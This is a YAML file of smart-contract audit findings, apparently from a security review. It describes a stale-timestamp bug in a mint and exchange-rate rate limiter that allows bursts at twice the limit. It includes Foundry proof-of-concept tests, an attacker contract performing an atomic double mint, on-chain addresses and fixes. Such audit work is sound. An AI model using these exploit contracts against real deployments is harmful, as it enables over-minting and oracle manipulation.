hypotheses:

  # ============================================================
  # DD-WT-01: MAIN FINDING — Stale allowancesLastSet enables 2x rate limit bypass
  # (Consolidated from MATH-WT-01, MATH-WT-02, WT-O-01, WT-FL-01, WT-TB-01)
  # ============================================================
  - id: DD-WT-01
    title: "Stale allowancesLastSet in _replenishAllowance enables 2x rate limit bypass for minting and exchange rate updates"
    severity: Medium
    confidence: 95
    validated: true
    redteam_verdict: REPORT
    redteam_notes: "4 attackers challenged. Escéptico: not centralization risk, it's code defect in security mechanism. Pragmático: burst matters because atomic execution eliminates reaction window. Bounty Expert: possible dup but wrapped-tokens less audited. Maximizer: can't justify High, Medium is honest."
    escalation_verdict: "Cannot escalate to High — requires compromised privileged role. Medium is correct."
    variant_hunt:
      - "V1: ExchangeRateUpdater.updateExchangeRate — same RateLimit._replenishAllowance bug, 2x exchange rate delta"
      - "V2: Second early return at L169 (amountToReplenish==0) compounds staleness"
      - "V3: Any future contract inheriting RateLimit.sol inherits the bug"
    onchain_verified: true
    onchain_evidence: "cbETH oracle = ExchangeRateUpdater at 0x9b37180d847B27ADC13C2277299045C1237Ae281, confirmed via cast call"
    root_cause: |
      RateLimit._replenishAllowance() has TWO early returns (L165 and L169) that
      skip updating allowancesLastSet. When allowance is at max, the timestamp
      becomes stale over time. When allowance is finally spent, the next call to
      _replenishAllowance computes replenishment from the stale timestamp, resulting
      in instant full restoration of the allowance.
    design_assumption_violated: |
      Developer assumed: "If allowance == maxAllowance, nothing changed, so no need
      to update the timestamp." Reality: TIME changed. The timestamp becomes stale,
      and the next replenishment calculation uses this stale value to grant instant
      full replenishment — violating the rate limit invariant.
    call_stack: |
      MintForwarder.mint(to, amount) [EXTERNAL, onlyCallers]
        └─ RateLimit._replenishAllowance(msg.sender) [INTERNAL]
            ├─ CHECK: allowances[caller] == maxAllowances[caller]?
            │   └─ YES → return (allowancesLastSet NOT updated) ← BUG
            ├─ _getReplenishAmount(caller) [INTERNAL VIEW]
            │   └─ secondsSinceAllowanceSet = block.timestamp - allowancesLastSet[caller]
            │   └─ amountToReplenish = (seconds * max) / interval → HUGE (stale!)
            │   └─ cap to maxAllowances - allowances = maxAllowances - 0 = max
            └─ allowances[caller] += max, allowancesLastSet = now
        └─ require(amount <= allowances[caller]) ← PASSES (restored to max)
        └─ allowances[caller] -= amount
        └─ MintUtil.safeMint(to, amount, tokenContract) [EXTERNAL CALL]
    solidity: |
      // Invariant: total minted in any interval-length window <= maxAllowances
      // Test: configure caller, wait, mint max, immediately mint max again
      function crytic_rate_limit_holds() public returns (bool) {
          uint256 mintedInWindow = totalMintedSince[caller][windowStart];
          return mintedInWindow <= maxAllowances[caller];
      }
    poc_sketch: |
      // Foundry PoC — Rate limit 2x bypass
      function test_stale_timestamp_double_mint() public {
          // Setup: deploy MintForwarder, configure caller with max=1000, interval=1 day
          mintForwarder.initialize(owner, address(fiatToken));
          vm.prank(owner);
          mintForwarder.configureCaller(caller, 1000, 86400);

          // Advance time 7 days — allowance stays at max, lastSet becomes stale
          vm.warp(block.timestamp + 7 days);

          // First mint: uses full allowance
          // _replenishAllowance early-returns (allowance==max), lastSet stays stale
          vm.prank(caller);
          mintForwarder.mint(recipient, 1000);
          assertEq(fiatToken.balanceOf(recipient), 1000);

          // Second mint: should fail (rate limit), but SUCCEEDS due to stale timestamp
          // _replenishAllowance computes: (7 days * 1000) / 86400 = 7000 → cap to 1000
          // Allowance instantly restored to 1000
          vm.prank(caller);
          mintForwarder.mint(recipient, 1000);
          assertEq(fiatToken.balanceOf(recipient), 2000); // 2x rate limit!

          // Third mint: correctly fails (lastSet now fresh)
          vm.prank(caller);
          vm.expectRevert("MintForwarder: mint amount exceeds caller allowance");
          mintForwarder.mint(recipient, 1000);
      }
    attack_path:
      - "1. Caller configured: maxAllowance=X, interval=T, lastSet=T0"
      - "2. Caller is inactive for period >> T. Allowance stays at X (max)."
      - "3. _replenishAllowance early-returns on every call (L165), lastSet remains T0"
      - "4. Caller sends TX1: mint(X) — allowance 0, lastSet STILL T0"
      - "5. Caller sends TX2 (same or next block): _replenishAllowance runs"
      - "6. secondsSince = now - T0 = HUGE → replenish capped to X"
      - "7. Allowance instantly restored to X. Caller mints X again."
      - "8. Total: 2X minted in 1-2 blocks. Rate limit says X per T."
    impact: |
      For MintForwarder (cbBTC/cbETH minting): compromised caller mints 2x the rate
      limit in one burst. If maxAllowance represents $10M worth of tokens, $20M can
      be minted before the rate limit kicks in properly.

      For ExchangeRateUpdater (cbETH): compromised caller shifts exchange rate by 2x
      the allowed delta. This exchange rate is read by DeFi protocols (Aave, Compound,
      Uniswap) as a price oracle. 2x the expected movement can trigger liquidations.

      Verified on-chain: ExchangeRateUpdater at 0x9b37180d847B27ADC13C2277299045C1237Ae281
      IS the oracle for cbETH (0xBe9895146f7AF43049ca1c1AE358B0541Ea49704).
      cbETH TVL: ~$886M. Exchange rate: 1.126 ETH/cbETH.
    fix: |
      Update allowancesLastSet at the START of _replenishAllowance, before early returns:

      function _replenishAllowance(address caller) internal {
          if (allowances[caller] == maxAllowances[caller]) {
              allowancesLastSet[caller] = block.timestamp; // FIX
              return;
          }
          // ... rest unchanged
      }
    severity_justification: |
      Medium (not High) because:
      1. Requires compromised authorized caller (not external attacker)
      2. Burst is bounded at 2x (not unlimited)
      3. Average throughput over time is still within rate limit
      4. FiatToken minterAllowance provides second layer of defense for minting
      However, for exchange rate updates there is NO second layer — rate limit
      is the ONLY defense against compromised ExchangeRateUpdater callers.

  # ============================================================
  # DD-WT-02: Second early return has identical bug
  # ============================================================
  - id: DD-WT-02
    title: "Second early return (amountToReplenish==0) compounds the stale timestamp issue"
    severity: Low
    confidence: 88
    validated: true
    root_cause: |
      _replenishAllowance L169: when amountToReplenish rounds to 0 (precision loss),
      the function returns WITHOUT updating allowancesLastSet. This means repeated
      calls that produce 0 replenishment accumulate staleness until a single call
      produces a large chunk of replenishment all at once.
    call_stack: |
      _replenishAllowance(caller)
        ├─ allowances != maxAllowances → proceed
        ├─ _getReplenishAmount(caller) → 0 (precision loss)
        └─ return (allowancesLastSet NOT updated) ← BUG #2
    solidity: |
      // Invariant: replenishment should be proportional to elapsed time
      function crytic_replenish_proportional() public returns (bool) {
          uint256 before = allowances[caller];
          uint256 timeBefore = block.timestamp;
          _replenishAllowance(caller);
          uint256 after_val = allowances[caller];
          uint256 elapsed = block.timestamp - timeBefore;
          uint256 expected = (elapsed * maxAllowances[caller]) / intervals[caller];
          return (after_val - before) <= expected + 1; // +1 for rounding
      }
    poc_sketch: |
      function test_second_early_return_staleness() public {
          // Setup: small maxAllowance, large interval
          vm.prank(owner);
          mintForwarder.configureCaller(caller, 100, 86400);

          // Use partial allowance
          vm.prank(caller);
          mintForwarder.mint(recipient, 50); // allowance=50

          // Many small time advances that produce 0 replenishment
          for (uint i = 0; i < 100; i++) {
              vm.warp(block.timestamp + 800); // 800s * 100 / 86400 = 0 (truncated)
              // currentAllowance triggers _replenishAllowance but gets 0 → no update
              mintForwarder.currentAllowance(caller);
          }

          // After 80000 seconds (100 * 800), should have replenished ~92.6 units
          // But allowancesLastSet was never updated during those 100 calls
          // Now a single call at 80001s: (80001 * 100) / 86400 = 92 → replenish 50 (capped)
          vm.warp(block.timestamp + 1);
          uint256 allowance = mintForwarder.currentAllowance(caller);
          assertEq(allowance, 100); // Full replenishment in one shot
      }
    impact: |
      Amplifies DD-WT-01. Creates step-function replenishment instead of linear.
      Lower severity because it requires specific conditions (precision loss) and
      the net effect over time is the same total replenishment.

  # ============================================================
  # DD-WT-03: Contract caller enables atomic double-spend in one TX
  # ============================================================
  - id: DD-WT-03
    title: "Contract-based caller enables atomic 2x mint in single transaction"
    severity: Medium
    confidence: 85
    validated: true
    root_cause: |
      DD-WT-01 requires 2 calls to mint(). If the caller is an EOA, these are 2
      separate transactions (different blocks possible). But if the caller is a
      CONTRACT (e.g., multisig, operations contract), both calls execute atomically
      in one transaction. This means:
      1. No time for Coinbase to detect and react between the two mints
      2. No possibility of front-running the second mint with a removeCaller
      3. The 2x burst happens in a single atomic operation
    call_stack: |
      AttackerContract.exploit() [single TX]
        └─ MintForwarder.mint(recipient, maxAllowance)
            └─ _replenishAllowance → early return (allowance==max)
            └─ allowance: max → 0
            └─ safeMint(recipient, maxAllowance)
        └─ MintForwarder.mint(recipient, maxAllowance)
            └─ _replenishAllowance → stale replenish → allowance: 0 → max
            └─ allowance: max → 0
            └─ safeMint(recipient, maxAllowance)
        // Total: 2 * maxAllowance minted atomically
    solidity: |
      // Invariant: sum of mints per caller per interval <= maxAllowance
      function crytic_atomic_rate_limit() public returns (bool) {
          uint256 balBefore = token.balanceOf(recipient);
          // Call mint twice atomically
          mintForwarder.mint(recipient, maxAllowances[caller]);
          mintForwarder.mint(recipient, maxAllowances[caller]);
          uint256 balAfter = token.balanceOf(recipient);
          return (balAfter - balBefore) <= maxAllowances[caller]; // SHOULD hold, WILL fail
      }
    poc_sketch: |
      // Attacker contract that exploits stale timestamp atomically
      contract AtomicMintExploit {
          MintForwarder public forwarder;
          address public recipient;

          constructor(address _forwarder, address _recipient) {
              forwarder = MintForwarder(_forwarder);
              recipient = _recipient;
          }

          function exploit(uint256 amount) external {
              // Both calls in same TX — atomic, no time for reaction
              forwarder.mint(recipient, amount);  // Uses stale allowance
              forwarder.mint(recipient, amount);  // Stale replenish → 2x
          }
      }

      function test_atomic_double_mint() public {
          AtomicMintExploit exploiter = new AtomicMintExploit(
              address(mintForwarder), recipient
          );

          // Owner configures the exploiter contract as caller
          vm.prank(owner);
          mintForwarder.configureCaller(address(exploiter), 1000, 86400);

          // Wait for staleness
          vm.warp(block.timestamp + 7 days);

          // Atomic exploit
          exploiter.exploit(1000);

          // Verify: 2000 minted, rate limit was 1000/day
          assertEq(fiatToken.balanceOf(recipient), 2000);
      }
    impact: |
      Atomic execution eliminates the detection/reaction window. For a compromised
      contract-caller, the entire 2x exploit happens in one block, one transaction.
      Coinbase cannot intervene between the two mints.

      This is the most practical attack vector for DD-WT-01 because:
      - Many organizations use contract-based callers (multisig, ops contracts)
      - An insider/compromised key in such a contract gets atomic access
      - The rate limit was designed to give time to react — atomicity defeats this

  # ============================================================
  # DD-WT-04: Burn asymmetry — minting is rate-limited but burning is not
  # ============================================================
  - id: DD-WT-04
    title: "Mint/burn asymmetry: MintForwarder rate-limits minting, but burn() on FiatTokenV2_1 has no rate limit"
    severity: Low
    confidence: 75
    validated: true
    root_cause: |
      MintForwarder is registered as a minter on FiatTokenV2_1. Minters in USDC
      architecture can both mint AND burn. MintForwarder.mint() enforces rate limit,
      but FiatTokenV2_1.burn() can be called directly by any minter without rate
      limiting. If MintForwarder calls burn(), it bypasses all rate limit logic.

      However, MintForwarder does NOT have a burn() function, so it can only burn
      by being called directly on the token contract. Since MintForwarder is a
      contract (not an EOA), it cannot call FiatTokenV2_1.burn() unless it has
      a function that does so. It doesn't — so this is a DESIGN observation,
      not an exploitable bug in the current code.

      BUT: if a future upgrade adds burn functionality to MintForwarder without
      rate limiting, or if a separate BurnForwarder is deployed without rate limits,
      the asymmetry becomes exploitable.
    call_stack: |
      MintForwarder.mint() → rate limited ✓
      MintForwarder → FiatTokenV2_1.burn() → NOT POSSIBLE (no burn function)
      BUT: If any other address is registered as minter on FiatTokenV2_1:
        DirectMinter → FiatTokenV2_1.burn() → NO rate limit ✗
    solidity: |
      // Design invariant: all value creation/destruction should be rate limited
      // VIOLATED for burn: FiatTokenV2_1.burn has no rate limit beyond minterAllowance
      function crytic_burn_rate_limited() public returns (bool) {
          // Cannot write meaningful assertion without burn path
          return true;
      }
    poc_sketch: |
      // Not exploitable with current contracts — design observation
      // If MintForwarder had: function burn(uint256 amount) external onlyCallers {
      //     FiatTokenV2_1(tokenContract).burn(amount); // No rate check!
      // }
      // Then a caller could burn unlimited tokens in one tx
    impact: |
      Currently not exploitable (MintForwarder has no burn function).
      Design gap: if Coinbase adds burn functionality without mirroring
      the rate limit, it creates an asymmetric attack surface.

  # ============================================================
  # DD-WT-05: currentAllowance() as external rate limit fixer
  # ============================================================
  - id: DD-WT-05
    title: "Public currentAllowance() can be used by defenders to fix stale timestamps, but also leaks allowance state to attackers"
    severity: Low
    confidence: 70
    validated: true
    root_cause: |
      currentAllowance(address) is PUBLIC with no access control. It calls
      _replenishAllowance which modifies state. This has two effects:

      1. DEFENSE: Anyone can call currentAllowance(caller) to trigger replenishment,
         which updates allowancesLastSet to now. This FIXES the stale timestamp from
         DD-WT-01. A monitoring bot could periodically call this for all callers to
         prevent staleness accumulation.

      2. ATTACK: An attacker monitoring the mempool sees a caller's mint TX. They
         know the caller's allowance state. If they see a large mint, they know the
         caller now has 0 allowance and can predict when the next mint will be possible.
         This is information leakage useful for planning attacks.

      However, the defense use is limited: if allowance is at max, the early return
      fires and allowancesLastSet is NOT updated. The only time currentAllowance()
      can fix staleness is when allowance < max — but at that point the timestamp
      was already updated by the last replenishment.

      CONCLUSION: currentAllowance() CANNOT fix the stale timestamp for the primary
      attack scenario (allowance at max). The defense angle is a dead end.
    call_stack: |
      Anyone → currentAllowance(caller)
        └─ _replenishAllowance(caller)
            └─ IF allowances == maxAllowances → early return (NO FIX!)
            └─ IF allowances < max → replenish + update timestamp (but this case is already fresh)
    solidity: |
      // Observation: currentAllowance cannot fix stale timestamps when at max
      function crytic_currentAllowance_fixes_staleness() public returns (bool) {
          // After calling currentAllowance, allowancesLastSet should be recent
          currentAllowance(caller);
          return (block.timestamp - allowancesLastSet[caller]) < intervals[caller];
          // FAILS when allowance == max (early return)
      }
    poc_sketch: |
      function test_currentAllowance_cannot_fix_staleness() public {
          vm.prank(owner);
          mintForwarder.configureCaller(caller, 1000, 86400);

          // Wait 7 days — timestamp becomes stale
          vm.warp(block.timestamp + 7 days);

          // Try to "fix" by calling currentAllowance
          mintForwarder.currentAllowance(caller);

          // Check: lastSet should be updated to now
          uint256 lastSet = mintForwarder.allowancesLastSet(caller);
          // lastSet is STILL the original configuration time, NOT now
          // Because allowances == maxAllowances → early return
          assertTrue(block.timestamp - lastSet > 6 days); // STALE!
      }
    impact: |
      Confirms that the stale timestamp cannot be mitigated by external calls.
      The only "fix" would be for the caller to consume some allowance, wait for
      replenishment (which updates the timestamp), and only then proceed normally.
      This is not a practical mitigation — the bug requires a code fix.
